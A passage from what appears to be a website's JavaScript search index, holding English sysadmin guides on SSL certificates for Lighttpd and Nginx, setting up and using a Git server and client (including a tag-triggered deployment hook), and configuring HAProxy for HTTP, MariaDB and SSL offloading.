ssl.engine = \"enable\" ssl.pemfile = \"/etc/lighttpd/ssl/server.pem\" ssl.ca-file = \"/etc/lighttpd/ssl/ca-certs.crt\" } Don’t forget to restart your Lighttpd server for the parameters to take effect :-)\nNginx linkFor Nginx, it’s a bit different from Lighttpd. We’ll create the unified certificate like this:\ncat ssl.crt sub.class2.server.ca.pem ca.pem \u003e /etc/nginx/ssl/server-unified.crt Then configure Nginx (/etc/nginx/sites-enabled/www.deimos.fr):\n[...] ssl on; ssl_certificate /etc/nginx/ssl/server-unified.crt; ssl_certificate_key /etc/nginx/ssl/server.key; [...] Then restart Nginx for the certificates to work.\nResources link http://forum.startcom.org/viewtopic.php?t=719 ↩︎\nhttp://www.startssl.com/?app=42 ↩︎\n"
            }
        );
    index.add(
            {
                id:  162 ,
                href: "\/Mise_en_place_d\u0027un_serveur_et_client_Git\/",
                title: "Setting Up a Git Server and Client",
                description: "This guide covers installation and configuration of Git server and client, with details on managing repositories, branches, tags, and advanced features.",
                content: " Introduction linkGit is a distributed version control system. It’s free software created by Linus Torvalds, the creator of the Linux kernel, and distributed under GNU GPL version 2.\nLike BitKeeper, Git doesn’t rely on a centralized server. It’s a low-level tool, designed to be simple and highly efficient, whose main task is to manage the evolution of a file tree.\nGit indexes files based on their checksum calculated with the SHA-1 function. When a file isn’t modified, the checksum doesn’t change, and the file is stored only once. However, if the file is modified, both versions are stored on the disk.\nGit wasn’t initially a version control system in the strict sense. Linus Torvalds explained that “in many ways, you can consider git as a filesystem: it allows associative addressing, and has the notion of versioning, but most importantly, I designed it by solving the problem from a filesystem specialist’s perspective (my job is kernels!), and I had absolutely no interest in creating a traditional version control system.” It has since evolved to incorporate all the features of a version control system.\nGit is considered to be highly performant, to the point where some other version control systems (Darcs, Arch) that don’t use databases have shown interest in Git’s file storage system for their own operations. However, they would continue to offer more advanced features.\nInstallation linkFirst, let’s install Git on the server:\naptitude install git git-core If you want to make the server accessible via a git:// address, you’ll also need to install:\naptitude install git-daemon-run Configuration linkServer linkFirst, we’ll create the repository:\n$ mkdir myproject $ cd myproject $ git init Initialized empty Git repository in .git/ Now that our project is created, let’s add a small file to make sure everything is working correctly:\ntouch test Then we’ll add it and commit it:\n$ git add . $ git commit -m \"test\" Created initial commit c491bd6: test 1 files changed, 1 insertions(+), 0 deletions(-) create mode 100644 afile To check the status at any time, run:\ngit status Next, we clone this repository:\n$ cd .. $ git clone --bare myproject myproject.git Initialized empty Git repository in /var/cache/git/myproject.git/ 0 blocks $ ls myproject.git branches config description HEAD hooks info objects refs clone: creates a copy of the repository locally –bare: creates a copy containing only the info from the myproject folder myproject.git: folder that git has created for us The git protocol linkIf you want to make git accessible via its protocol (git://), you need to configure the following file like this:\n#!/bin/sh exec 2\u003e\u00261 echo 'git-daemon starting.' exec chpst -ugitdaemon \\ \"$(git --exec-path)\"/git-daemon --verbose --base-path=/var/cache /var/cache/gi Then for each project you want to make accessible from outside, you’ll need to place a ‘git-daemon-export-ok’ file:\ntouch /var/cache/git/myproject.git/git-daemon-export-ok Restart the daemon and it will now be accessible on port 9418.\nClient linkYou should first install Git as done on the server.\nThen with your current user, inform git about your identity (make sure your user exists on the server):\ngit config --global user.email \"xxx@mycompany.com\" git config --global user.name \"deimosfr\" This should create the following in your ~/.gitconfig:\n[user] email = xxx@mycompany.com name = Deimos If you want to have different identities for different repositories, simply remove global (by placing yourself in the repository in question):\ngit config user.email \"xxx@mycompany.com\" git config user.name \"Deimos\" Now we will retrieve our project from our git. We’re using the SSH method here, but git can also work with rsync, http, https, and git-daemon.\nWith SSH linkHere’s the SSH method:\n$ git clone ssh://username@host/var/cache/git/myproject Initialized empty Git repository in /var/cache/git/myproject/.git/ Password: remote: Counting objects: 1, done. remote: Total 1 (delta 0), reused 0 (delta 0) Receiving objects: 100% (1/1), done. $ ls myproject $ ls myproject test For repository updates, you’ll need to use the push option. First, changes must be made locally (that’s the advantage of git), such as an add and a commit (we’ll see this just after): git push ssh://username@host/var/cache/git/myproject.git or\ngit push ssh://username@host/var/cache/git/myproject.git master ‘master’ here corresponds to the branch name we’re interested in (see below for using branches).\nTo add a file to an SSH repository: git remote add test ssh://username@host/var/cache/git/myproject.git git commit -a git push test In the future, to avoid dealing with SSH and its special commands, add this to your ~/.gitconfig file:\n[remote \"myproject\"] url = ssh://username@host/var/cache/git/myproject/ With Git-daemon linkGit will refuse to synchronize if the folder in question doesn’t contain a file called ‘git-daemon-export-ok’. Once this file is created, the folder will be accessible to everyone:\ngit clone git://serveur.git/git/myproject or\ngit clone git://serveur.git/git/myproject.git We can use the following options:\n‘–export-all’: this option no longer requires the ‘git-daemon-export-ok’ file ‘–user-path=gitexport’: this option will allow URLs on user home directories. So git://deimos-laptop/~deimos/myproject.git will point to /home/deimos/gitexport/myproject.git On HTTP (with Nginx) linkI spent quite a bit of time getting Git over http(s) and Gitweb to coexist, but it’s working now.\ninfo Prefer the Gitweb method alone if you don’t need git over http(s). Here’s the method I used:\nserver { listen 80; listen 443 ssl; ssl_certificate /etc/nginx/ssl/deimos.fr/server-unified.crt; ssl_certificate_key /etc/nginx/ssl/deimos.fr/server.key; ssl_session_timeout 5m; server_name git.deimos.fr; root /usr/share/gitweb/; access_log /var/log/nginx/git.deimos.fr_access.log; error_log /var/log/nginx/git.deimos.fr_error.log; index gitweb.cgi; # Drop config include drop.conf; # Git over https location /git/ { alias /var/cache/git/; if ($scheme = http) { rewrite ^ https://$host$request_uri permanent; } } # Gitweb location ~ gitweb\\.cgi { fastcgi_cache mycache; fastcgi_cache_key $request_method$host$request_uri; fastcgi_cache_valid any 1h; include fastcgi_params; fastcgi_pass unix:/run/fcgiwrap.socket; } } Here I have my git over https working (http is redirected to https) as well as my gitweb since everything that matches gitweb.cgi is caught. Now, for the git part, we’ll need to authorize the repositories we want. For that, we’ll need to rename a file in our repository and run a command:\ncd /var/cache/git/myrepo.git hooks/post-update{.sample,} su - www-data -c 'cd /var/cache/git/myrepo.git \u0026\u0026 /usr/lib/git-core/git-update-server-info' Replace www-data with the user who has rights to the repository. Use www-data so that nginx has the rights. Then you have permissions to clone:\ngit clone http://www.deimos.fr/git/deimosfr.git deimosfr Configuring a proxy linkIf you need to go through a proxy with Git, you can do it like this (for its global part):\ngit config --global http.proxy http://proxy:8080 To check the current settings:\ngit config --get http.proxy If you need to remove this configuration:\ngit config --global --unset http.proxy Usage linkUpdating your local repository linkIf you want to update your local repository from the server, it’s simple:\ngit pull or\ngit pull ssh://username@host/var/cache/git/myproject/ Adding files linkTo add files in bulk, use this command:\ngit add * Committing changes linkIf you want to both log and commit at the same time (otherwise leave out -m…):\ngit commit -a -m \"My first addition\" This will update the repository locally (don’t forget to push afterwards if you’re working with a remote server).\nChanging the default editor and viewer linkYou can force vim and less for example by entering these lines:\ngit config --global core.editor vim git config --global core.pager \"less -FSRX\" Getting logs linkYou can check the logs of previous commits at any time with this command:\ngit log If you want to get logs for a specific file:\ngit log test If your file has been renamed, use the –follow option to see its new name as well. To see logs from the last 2 days:\ngit log --since=\"2 days ago\" Searching linkYou can search for content in files like this:\ngit grep deimos * Ignoring files linkYou may want to exclude certain files such as vim temporary files. You’ll need to create a .gitignore file at the root of the working copy, which will generally be added to the repository itself, or in the .git/info/exclude file. Here’s an example:\n*~ *.o Making sure there’s nothing to commit linkYou can ensure there’s nothing to commit like this:\n\u003e git stash No local changes to save Configuring aliases linkYou can configure aliases for longer commands. For example, if you’re used to SVN:\ngit config --global alias.co 'checkout' git config --global alias.ci 'commit -a -m' Here ‘git co’ corresponds to the ‘git checkout’ command. This configuration (whether global or not) can be located in 2 places:\n~/.gitconfig to benefit from it in all your repositories. .git/config of a project to restrict its access to that single project. Revert: canceling a commit linkGit revert allows you to cancel the previous commit by introducing a new one. First, we’ll do a git log to get the commit number:\n$ git log commit : bfbfefa4d9116beff394ad29e2721b1ab6118df0 Then we’ll do a revert to cancel the old one:\ngit revert bfbfefa4d9116beff394ad29e2721b1ab6118df0 In case of conflict, simply make manual changes, do another add, and then commit.\nNote: you can also use the first few characters of the commit identifier (SHA-1) such as bfbfe. Git will automatically complete it (as long as another commit doesn’t start with the same characters).\nReset: deleting all commits from an old one linkGit reset will completely remove all commits made after a certain version:\ngit reset bfbfefa4d9116beff394ad29e2721b1ab6118df0 Git reset allows you to rewrite history. You can verify this with a ‘git log’. This can have serious consequences if you’re working with others on a project. Not only because the local repositories of other people will need to be resynchronized, but also because there can be many conflicts. It is therefore advised to use this command with caution. Then you must redo a ‘git add’ of your files, then a ‘git commit’.\nIf you want the local working copy to reflect the repository, add the –hard option during reset:\ngit reset **--hard** bfbfefa4d9116beff394ad29e2721b1ab6118df0 In case you’re having a terrible day and deleted months of work and want to go back, git has preserved the previous state, so do:\ngit reset --hard ORIG_HEAD HEAD means the last commit by default.\nIf you get a message like:\n! [rejected] master -\u003e master (non-fast forward) And you really want to force the commit to look exactly like what you have on your machine:\ngit push origin +master Restoring a file from an old commit linkYou can choose to restore only a particular file from an old commit via the checkout command:\ngit checkout bfbfe test Deleting a file linkThere are 2 methods; my preferred one, which I find simple:\ngit rm my_file The 2nd method consists of doing a standard rm, then at the next git commit -a, it will detect that this file no longer exists and will remove it from the repository.\nMoving a file linkTo move a file within your git repository, use this command:\ngit mv test1 test2 Listing the repository contents linkYou can use this command to list the contents of a repository:\ngit ls-files Note: empty directories will not be displayed\nCreating a repository archive linkTo create an archive in tar gzip format, we’ll use the archive option:\ngit archive --format=tar --prefix=version_1/ HEAD | gzip \u003e ../version_1.tgz –prefix: allows giving a folder that will be created upon decompression. HEAD: allows specifying the commit (here the 1st) Viewing a specific file from a commit linkIt’s possible to view a file (README) from a commit:\ngit show 291d2ee31feb4a318f77201dea941374aae279a5:README or see all diffs at once if you don’t specify the file:\ngit show 291d2ee31feb4a318f77201dea941374aae279a5 Rewriting history linkIf you forgot to do something in a previous commit and want to go back, you need to do an interactive rebase by indicating the earliest commit you want to modify:\ngit rebase -i cbde26ad^ In the editor, change ‘pick’ to ’edit’ on the line(s) you want to modify. Save and exit. Make all your changes and then validate the commit:\ngit commit -a --amend or git commit -a --amend --no-edit Then, to move on to the next commit:\ngit rebase --continue Until it’s finished.\nMaking diffs between different versions linkIt’s very easy with git to make diffs between different versions. For example, from HEAD to 2 versions back:\ngit diff HEAD~2 HEAD Modifying the text of the last commit linkTo see the state of the last log, we can do:\ngit log -n 1 To modify the text of this last log, we’ll use the amend option:\ngit commit -a --amend This allows you to change just the text; there won’t be a new commit number. Only the identification number will change.\nModifying the date of the last commit linkIt’s possible to modify the date of the last commit:\nGIT_COMMITTER_DATE=\"`date`\" git commit --amend --date \"`date`\" Or you can specify the date explicitly:\nGIT_COMMITTER_DATE=\"Fri Nov 17 12:00:00 CET 2014\" git commit --amend --date \"Fri Nov 17 12:00:00 CET 2014\" Modifying the author of commits linkWhen using multiple Git accounts on the same machine, it’s easy to make a mistake when cloning a repository and not setting the right username and email address. When you realize it, it’s too late and you need to rewrite part of the history to correct the information:\n\u003e git filter-branch --env-filter ' oldname=\"old username\" oldemail=\"old email address\" newname=\"new username\" newemail=\"old username address\" [ \"$GIT_AUTHOR_EMAIL\"=\"$oldemail\" ] \u0026\u0026 GIT_AUTHOR_EMAIL=\"$newemail\" [ \"$GIT_COMMITTER_EMAIL\"=\"$oldemail\" ] \u0026\u0026 GIT_COMMITTER_EMAIL=\"$newemail\" [ \"$GIT_AUTHOR_NAME\"=\"$oldname\" ] \u0026\u0026 GIT_AUTHOR_NAME=\"$newname\" [ \"$GIT_COMMITTER_NAME\"=\"$oldname\" ] \u0026\u0026 GIT_COMMITTER_NAME=\"$newname\" ' HEAD Synchronizing only part of a repository linkIf you want to have only part of a repository (also called sparse), you’ll need to first retrieve the entire repository, then specify what interests you. Only what interests you will remain:\ngit clone ssh://deimos@git/var/cache/git/git_deimosfr . git config core.sparsecheckout true echo configs/puppet/ \u003e .git/info/sparse-checkout git read-tree -m -u HEAD Here in the git_deimosfr repository, only the “configs/puppet/” folder interests me. You can add multiple folders to the “.git/info/sparse-checkout” file line by line if you want to keep multiple files.\nUsing an external git repository within a git linkIf, for example, you already have a Git in which you want to integrate another Git, but external, you’ll need to use submodules. For my part, I have a puppet folder with lots of modules inside. Some of these modules weren’t created by me and are maintained by other people who have a Git. I want some modules to point to external gits. Here’s how to proceed:\nI add the external source to this git: \u003e git submodule add git://git.black.co.at/module-common configs/puppet/modules/common Cloning into configs/puppet/modules/common... remote: Counting objects: 423, done. remote: Compressing objects: 100% (298/298), done. remote: Total 423 (delta 155), reused 203 (delta 70) Receiving objects: 100% (423/423), 53.96 KiB, done. Resolving deltas: 100% (155/155), done. Now you just need to commit and push if you want to make this configuration valid on the server.\nNow let’s consider the case of a client who does a pull. They will get your entire tree structure, but not the external links; for that, they will need to execute the following commands: \u003e git submodule init Submodule 'configs/puppet/modules/common' (git://git.black.co.at/module-common) registered for path 'configs/puppet/modules/common' \u003e git submodule update Cloning into configs/puppet/modules/common... remote: Counting objects: 423, done. remote: Compressing objects: 100% (298/298), done. remote: Total 423 (delta 155), reused 203 (delta 70) Receiving objects: 100% (423/423), 53.96 KiB, done. Resolving deltas: 100% (155/155), done. Submodule path 'configs/puppet/modules/common': checked out 'ba28f3004d402c250ef3099f95a1ae13740b009f' If during a clone you want the submodules to also be taken, you need to add the “–recursive” option. Example:\ngit clone --recursive git://git.deimos.fr/git/git_deimosfr Branches linkCreating a branch linkIf, for example, the current version you have on git suits you and you want to make it stable, you need to use branches and create a new branch as a development branch:\ngit branch devel Sending a branch to the server linkTo send a branch to the server:\ngit push origin Listing branches linkNow, the devel branch is created; to check:\n$ git branch -a devel * master The ‘*’ indicates the current branch (in use).\nWhen using remote branches, you can list them with this option:\n$ git branch -r devel * master Changing branches linkTo change branches, simply use the checkout option:\n$ git checkout devel Switched to branch \"devel\" Let’s check:\n$ git branch * devel master If we want to go back to the previous branch, we can at any time do:\n$ git checkout -f master $ git branch * master devel The -f option corresponds to the –hard option of reset which allows synchronizing local changes made to the repository.\nIf you’re working on a remote branch, do this for example:\n$ git checkout deimos/myproject -b master $ git branch * master devel Getting a branch from a remote server linkOnce your “pull” is done, change branches like this (you can name it differently if you wish):\ngit checkout -b origin/ new_branch: the name of my new local branch new_remote_branch: the name of the new remote branch (server side) Deleting a branch linkTo delete a branch, nothing simpler:\ngit branch -d devel If this works, perfect; if you want to force in case of a problem, use ‘-D’ instead of ‘-d’. To apply the changes to the remote server:\ngit push origin :devel This will delete the devel branch on the remote server.\nMerging branches linkThe merge option consists of completely merging 2 branches. Like for example merging a devel branch with a stable one so that devel becomes stable:\ngit checkout master git merge devel Rebase: Applying a patch to multiple branches linkImagine we’ve been working on the devel branch but a bug in master has been discovered. It’s normal that if master gets the fix, the devel branch should get it too. We’ll place ourselves in the master branch, apply the patch, then merge the patch with the devel branch. We place ourselves on the devel branch, then execute these commands:\ngit checkout devel git rebase master It’s possible to do it interactively with the -i argument:\ngit rebase -i master Creating a branch during a restoration linkYou can create a branch when restoring a file by first placing yourself in the branch and using the -b option:\n$ git checkout bfbfefa4d9116beff394ad29e2721b1ab6118df0 -b version_2 Switched to a new branch \"version_2\" Tags linkTags are very useful for marking a specific version. For example, to release version 1.0, you can create a tag and reuse it later to download this particular version. You can tag anything; it allows for easy referencing.\nCreating a Tag linkTo create a tag, it’s easy:\ngit tag '1.0' info It’s possible to sign tags via GPG Listing tags linkTo list available tags:\ngit tag Deleting a tag linkTo delete a tag:\ngit tag -d v0.1 git push origin :refs/tags/v0.1 Sending tags to the server linkOnce the tags are created locally, you can push them to the server:\ngit push --tags Managing conflicts linkYou can manage conflicts interactively:\ngit mergetool Automatic resolution of already seen conflicts linkIt’s possible to ask git to automatically resolve problems it has already encountered:\ngit config --global rerere.enabled 1 Using git to find a bug linkImagine a sneaky bug suddenly appears and disrupts your project. After investigations worthy of an English pipe smoker, you discover that the nasty malfunction has only appeared recently. It’s clearly a regression!\nSure, you could waste time fixing this regression the classic way, by diving into dusty code full of virtual cobwebs, but it would be much simpler to discover exactly when it appeared, which commit corresponds to it, to have a very precise idea of its cause.\nThis is exactly what git-bisect allows you to do, in a particularly intuitive way. Tell it a commit with the malfunction (HEAD), and a past commit, any one, that doesn’t have it.\nGit then places you in your development history, right in the middle between the two commits. After checking, you tell git whether the regression appears or not. And we start again. Each time, we divide by 2 the range of commits that potentially introduced the bug, until we catch the culprit. Great, isn’t it?\nLet’s put it into practice:\n\u003e git bisect start \u003e git bisect bad \u003e git bisect good Bisecting: 8 revisions left to test after this 8 commits potentially introduced the regression. We indicate whether the current commit is correct or not:\n\u003e git bisect good # or git bisect bad Bisecting : 4 revisions left to test after this And we continue, again and again, until we find the bad commit that caused this wasted time (but it could have been worse):\n37b4745bf75e44638b9fe796c6dc97c1fa349e8e is first bad commit At any point, you can get a history of your journey:\ngit bisect log If at a specific moment, you don’t want to test a particular commit, for whatever reason, use the command:\ngit bisect skip All this is fine and good, but there’s better (no!? yes!). Suppose you’re a fan of TDD. You surely have a script that automatically tests whether the current code is good or not. It’s then possible to automate the search:\ngit bisect start HEAD -- git bisect run script Go get a coffee, git is working for you. Note: the script must return 0 if the code is correct, 1 if it’s incorrect, and 125 if it’s untestable (git skip). During bisection, git creates a special dedicated branch. Don’t forget to switch back to your development branch when you’ve caught the regression. You can do it simply by typing:\ngit bisect reset So, with all this, no more tedious regression searches.\nKnowing commits line by line linkThis is the solution for slapping the fingers of someone who did a commit. Among other things, you have the ability to know line by line who wrote what:\n\u003e git blame ^a35889c (Deimos 2010-04-20 17:36:29 +0200 1) \u003c?php ^a35889c (Deimos 2010-04-20 17:36:29 +0200 2) class DeleteHistory extends SpecialPage ^a35889c (Deimos 2010-04-20 17:36:29 +0200 3) { 724f724d (Deimos 2011-06-14 23:15:40 +0200 4) function __construct() 724f724d (Deimos 2011-06-14 23:15:40 +0200 5) { 724f724d (Deimos 2011-06-14 23:15:40 +0200 6) // Need to belong to Administor group 724f724d (Deimos 2011-06-14 23:15:40 +0200 7) parent::__construct( 'DeleteHistory', 'editinterface' ); 724f724d (Deimos 2011-06-14 23:15:40 +0200 8) wfLoadExtensionMessages('DeleteHistory'); Moving a folder and its history to another repository linkSometimes you may need to recreate another empty repository to contain a folder from another repository. This was my case for the DeleteHistory extension for Mediawiki that I created. At first, I had a repository called ‘mediawiki_extensions’ where I had 2 extensions. And then with time and advancing Mediawiki versions, it was preferable to separate by plugins while keeping the history. So I’ll explain how I did it (I followed this documentation).\nWe’ll work locally with my old repository which we’ll call oldrepo and my new repository newrepo (how original).\nwarning Create a temporary repository if you already have one because it will be deleted at the end So let’s clone this repo:\ngit clone git://git.deimos.fr/oldrepo.git git clone git://git.deimos.fr/newrepo.git Then we’ll filter for the folder we’re interested in, let’s call it folder2keep:\ngit filter-branch --subdirectory-filter folder2keep -- -- all Now, all the files and folders from folder2keep are at the root of our repository. If you wish, you can create a folder and place everything inside, but this is not mandatory:\nmkdir new_directory/ git mv * new_directory/ Replace * with all elements you want to place inside and commit:\ngit commit -m \"Collected the data I need to move\" Now, we’ll go into our famous folder and make a local reference between the 2:\ncd ../newrepo/ git remote add oldrepo ../oldrepo/ Then we’ll bring in the sources, create the main branch, and merge everything:\ngit fetch oldrepo git branch oldrepo remotes/oldrepo/master git merge oldrepo Now we’ll transfer the history and do some cleaning:\ngit remote rm oldrepo git branch -d oldrepo git push origin master And there you go, the temporary repository (old) can now be deleted.\nHooks linkThere are hooks in Git allowing pre or post processing. Here’s a use case for performing an action (running a command via ssh) when a tag arrives on the server. The idea is to be able to deploy a new version of software on X servers based on a tag (example: prod or preprod). Here are the options that will be necessary:\nCreate a hook in the repository Create a dedicated user if you use Gitlab/GitHub/Gitolite Generate a private SSH key with the ‘git’ user Copy via ssh-copy-id to remote servers the ‘git’ user key (usually www-data) Create a deployment script and set the proper permissions Clone the repository on all necessary servers #!/bin/bash # Create your environment with DNS/IP servers separated by spaces name=( list array ) prod=( X.X.X.X Y.Y.Y.Y ) preprod=( Z.Z.Z.Z ) # Folder to deploy on client side folder='/var/www/cloned_repository' # Set SSH remote username ssh_username='www-data' # Log file logfile='/var/log/git-deploy-hook.log' ######################################################################## # get infos read oldrev newrev refname # vars tag=`echo $refname | cut -d/ -f3` environment=`echo $tag | cut -d- -f1` # function to call distant git deployments deploy_new_version() { declare -a servers=(\"${!1}\") echo $(date +'%Y/%m/%d - %H-%M-%S ') \"Begin deployment hook for $environment env\" \u003e\u003e $logfile for server in $(seq 0 $((${#servers[@]} - 1))) ; do echo \"Deploying $tag\" \u003e\u003e $logfile ssh $ssh_username@${servers[$server]} /usr/bin/git_deploy.sh $tag $folder 2\u003e\u00261 \u003e\u003e $logfile done echo $(date +'%Y/%m/%d - %H-%M-%S ') \"Deployment hook finished for $environment env\" \u003e\u003e $logfile } # check if a tag has been pushed if [[ -n $(echo $refname | grep -Eo \"^refs/tags/$environment\") ]]; then echo \"Git hook is called for $environment environment\" if [ ${!environment[0]} ] ; then # Deploy the correct environment deploy_new_version $environment[@] else echo \"Error, $environment is not recognized as an existing environment\" exit 1 fi fi You need to modify the environments with the ones you want so that when a tag arrives with the name of the tag in question, an action is triggered behind it. For example, to deploy on production servers, you’ll need to put a tag like “prod-v1.0”.\nSwitch to the git user (or the one who has the rights) and copy the public key to all the servers on which the tags will need to act:\nsu - git ssh-copy-id www-data@x.x.x.x Then create the deployment script:\n#!/bin/bash logfile='/var/log/git-deploy-hook.log' echo $(date +'%Y/%m/%d - %H-%M: ') 'Begin deployment hook' \u003e\u003e$logfile cd $2 git fetch origin -v \u003e\u003e $logfile 2\u003e\u00261 git fetch origin -v --tags \u003e\u003e $logfile 2\u003e\u00261 git stash drop \u003e\u003e $logfile 2\u003e\u00261 git checkout -f tags/$1 \u003e\u003e $logfile 2\u003e\u00261 echo $(date +'%Y/%m/%d - %H-%M: ') 'Deployment finished' \u003e\u003e $logfile You can add any commands you want. You obviously need to copy this script to all target servers and give it execution rights.\nCreate the log file and set the right permissions:\ntouch /var/log/git-deploy-hook.log chow www-data. /var/log/git-deploy-hook.log chmod 755 /usr/bin/git_deploy.sh Then clone the repositories with the final users:\ncd /var/www git clone git@gitlab/cloned_repository.git chown -Rf www-data. /var/www/cloned_repository And there you go, all that’s left is to push a tag on a commit:\ngit tag -a prod-v1.0 -m 'production version 1.0' 9fceb02 git push --tags Utilities linkGitk linkGitk provides a graphical version of your git status (branches etc.).\nFAQ linkwarning: You did not specify any refspecs to push, and the current remote linkIf you get this kind of message when you do a push:\nwarning: You did not specify any refspecs to push, and the current remote warning: has not configured any push refspecs. The default action in this warning: case is to push all matching refspecs, that is, all branches warning: that exist both locally and remotely will be updated. This may warning: not necessarily be what you want to happen. warning: warning: You can specify what action you want to take in this case, and warning: avoid seeing this message again, by configuring 'push.default' to: warning: 'nothing' : Do not push anything warning: 'matching' : Push all matching branches (default) warning: 'tracking' : Push the current branch to whatever it is tracking warning: 'current' : Push the current branch Simply run this command, selecting what corresponds best to you:\ngit config --global push.default matching References linkhttp://www.kernel.org/pub/software/scm/git/docs/user-manual.html http://git.wiki.kernel.org/index.php/GitFaq http://alexgirard.com/git-book/index.html How To Install A Public Git Repository On A Debian Server Git it http://www.unixgarden.com/index.php/administration-systeme/git-les-mains-dans-le-cambouis http://stackoverflow.com/questions/1811730/how-do-you-work-with-a-git-repository-within-another-repository http://chrisjean.com/2009/04/20/git-submodules-adding-using-removing-and-updating/\n"
            }
        );
    index.add(
            {
                id:  163 ,
                href: "\/haproxy-load-balance-your-traffic\/",
                title: "HAProxy: Load Balance Your Traffic",
                description: "How to install and configure HAProxy to load balance HTTP traffic, MySQL/MariaDB databases, and perform SSL offloading.",
                content: " Software version 1.4.24 Operating System Debian 7 Website HAProxy Website Last Update 21/01/2015 Introduction linkHAProxy is an open source TCP/HTTP load balancer, commonly used to improve the performance of web sites and services by spreading requests across multiple servers. Its name stands for High Availability Proxy. It is written in C and has a reputation for being fast, efficient (in terms of processor and memory usage) and stable.\nHAProxy is used by a number of high-profile websites including Stack Overflow, Reddit, Tumblr, and Twitter and is used in the OpsWorks product from Amazon Web Services.\nInstallation linkIn Debian 7, HAProxy is unfortunately not present. So you need to activate backports:\n(/etc/apt/sources.list.d/backports.list)\ndeb http://ftp.fr.debian.org/debian/ wheezy-backports main deb-src http://ftp.debian.org/debian/ wheezy-backports main Then you can install HAProxy:\naptitude update aptitude install haproxy Configuration linkYou can have several kinds of configuration as HAProxy knows how to check specific things like MySQL, even if it’s specialized in HTTP and TCP protocols.\nHTTP linkHere is a good configuration for HTTP pages with sticky sessions:\n(/etc/haproxy/haproxy.cfg)\nglobal # log redirection (syslog) log /dev/log\tlocal0 log /dev/log\tlocal1 notice # maximum of connexions for haproxy maxconn 4096 # chroot for security reasons chroot /var/lib/haproxy # user/group for haproxy process user haproxy group haproxy # act as a daemon daemon defaults # use gloval log declaration log\tglobal # default check type mode\thttp # logs which servers requests go to, plus current connections and a whole lot of other stuff option\thttplog # only log failed connexions # retry 3 times before setting node as failed # redispatch traffic to other servers option\tdontlognull retries 3 option redispatch # maximum connexion for the backend maxconn 2000 # timeouts contimeout 5000 clitimeout 50000 srvtimeout 50000 # check webservers for health, taking them out of the queue as necessary option httpchk # haproxy frontend frontend http-in bind *:80 # acl for each backends acl is_deimosfr hdr_end(host) -i deimos.fr acl is_mavrofr hdr_end(host) -i mavro.fr use_backend deimosfr if is_deimosfr use_backend mavrofr if is_mavrofr default_backend deimosfr # backend1 backend deimosfr # use sticky session to stick clients on the same server cookie SERVERID insert indirect balance roundrobin # cookie SERVERID is \"www1\" server www1 192.168.0.1:8080 cookie www1 check # cookie SERVERID is \"www2\" server www2 192.168.0.2:8080 cookie www2 check # backend2 backend mavrofr cookie SERVERID insert indirect balance roundrobin server www1 192.168.0.1:8080 cookie www1 check server www2 192.168.0.2:8080 cookie www2 check MySQL/MariaDB linkHere is a load balancing version for 2 MySQL nodes:\n(/etc/haproxy/haproxy.cfg)\nglobal # log redirection (syslog) log /dev/log\tlocal0 log /dev/log\tlocal1 notice # maximum of connexions for haproxy maxconn 4096 # chroot for security reasons chroot /var/lib/haproxy # user/group for haproxy process user haproxy group haproxy # act as a daemon daemon defaults # use gloval log declaration log\tglobal # default check type mode\thttp # only log when closing session option\ttcplog # only log failed connexions # retry 3 times before setting node as failed # redispatch traffic to other servers option\tdontlognull retries 3 option redispatch # maximum connexion for the backend maxconn 1024 # timeouts contimeout 5000 clitimeout 50000 srvtimeout 50000 # enable web check health interface on port 80 listen haproxy 0.0.0.0:80 mode http stats enable # set credentials stats auth user:password # loadbalance on slaves listen mariadb-read-slaves 0.0.0.0:3306 # use tcp method mode tcp # round robin mechanism balance roundrobin # tcp keepalive (pipelining) on both side (clt/srv) option tcpka # perform mariadb connexion with haproxy user option mysql-check user haproxy # set all read only nodes # inter: interval of check in milliseconds server slave1 10.0.0.2:3306 check inter 1000 server slave2 10.0.0.3:3306 check inter 1000 Offloading SSL linkSSL Offloading permits to decrypt SSL and forward traffic to a web server without SSL. This can be very useful used with a caching server like Varnish (you can also do it with Nginx).\nTo start, create a SSL folder and concatenate all your certificates in one:\nmkdir /etc/haproxy/ssl cat server.crt server.key ca.pem sub.class2.server.ca.pem \u003e /etc/haproxy/ssl/server-unified.pem info If you have multiple domain names, concatenate all in the same server-unified.pem file Then you can apply this kind of configuration:\n(/etc/haproxy/haproxy.cfg)\nglobal log /dev/log\tlocal0 log /dev/log\tlocal1 notice chroot /var/lib/haproxy stats socket /run/haproxy/admin.sock mode 660 level admin stats timeout 30s user haproxy group haproxy daemon # Default SSL material locations ca-base /etc/ssl/certs crt-base /etc/ssl/private # Default ciphers to use on SSL-enabled listening sockets. # For more information, see ciphers(1SSL). ssl-default-bind-ciphers kEECDH+aRSA+AES:kRSA+AES:+AES256:RC4-SHA:!kEDH:!LOW:!EXP:!MD5:!aNULL:!eNULL ssl-default-bind-options no-sslv3 defaults log\tglobal mode\thttp # Add X-Forwarded-For headers for each requests option forwardfor # Close connections but maintain keep-alives (faster) option http-server-close option\thttplog option\tdontlognull timeout connect 5000 timeout client 50000 timeout server 50000 errorfile 400 /etc/haproxy/errors/400.http errorfile 403 /etc/haproxy/errors/403.http errorfile 408 /etc/haproxy/errors/408.http errorfile 500 /etc/haproxy/errors/500.http errorfile 502 /etc/haproxy/errors/502.http errorfile 503 /etc/haproxy/errors/503.http errorfile 504 /etc/haproxy/errors/504.http listen admin_stats 127.0.0.1:8080 mode http stats enable stats uri /haproxy-stats stats refresh 10s stats realm HAProxy\\ Statistics stats auth : frontend frontend-https bind :443 ssl crt /etc/haproxy/ssl/server-unified.pem reqadd X-Forwarded-Proto:\\ https default_backend ssl-backend backend ssl-backend # Redirect http -\u003e https #redirect scheme https if !{ ssl_fc } server :80 check maxconn 2048 Edit and replace highlighted lines with your desired information. Then restart HAProxy to apply the new configuration.\nWeb interface linkIf you activate the web interface, you can get multiple information (http:///haproxy?stats):\n"
            }
        );
    index.add(
            {
                id:  164 ,
                href: "\/MediaWiki:Installation_et_configuration\/",
                title: "MediaWiki: Installation and Configuration",
                description: "A comprehensive guide for installing, configuring and managing MediaWiki including manual and Debian installation methods, extensions, web server configuration and many customization options.",
